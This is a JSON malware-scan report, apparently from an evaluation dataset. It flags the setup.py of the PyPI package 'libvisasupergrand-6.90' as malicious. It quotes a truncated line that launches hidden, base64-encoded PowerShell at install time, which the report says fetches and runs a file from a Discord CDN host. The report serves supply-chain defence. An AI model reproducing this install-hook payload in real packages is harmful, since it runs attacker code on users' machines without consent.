{
  "package_name": "libvisasupergrand-6.90",
  "total_matches": 1,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/libvisasupergrand-6.90/libvisasupergrand-6.90/setup.py",
      "file_name": "setup.py",
      "detection_count": 1,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code contains a highly suspicious and strongly malicious pattern: it executes a hidden PowerShell command using a base64-encoded payload via subprocess.Popen during the installation process (in setup.py). The PowerShell command is obfuscated and, when decoded, downloads and executes a file from an external, attacker-controlled domain (cdn.discordapp.com/attachments/...). This is a classic supply chain attack technique, where arbitrary code is executed on the victim's machine without their knowledge or consent, immediately upon package installation. The use of obfuscated, encoded PowerShell, hidden window execution, and external payload retrieval is a hallmark of Python malware, especially in malicious PyPI packages. There is no legitimate reason for this behavior in a setup script, and it matches multiple critical risk indicators from the knowledge base, including remote code execution, payload obfuscation, and abuse of install-time hooks.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "9",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQA...O_WINDOW)",
          "full_match": "* This package is executing OS commands in the setup.py file at libvisasupergrand-6.90/setup.py:9",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/libvisasupergrand-6.90/libvisasupergrand-6.90/setup.py",
          "relative_path": "libvisasupergrand-6.90/setup.py"
        }
      ]
    }
  ]
}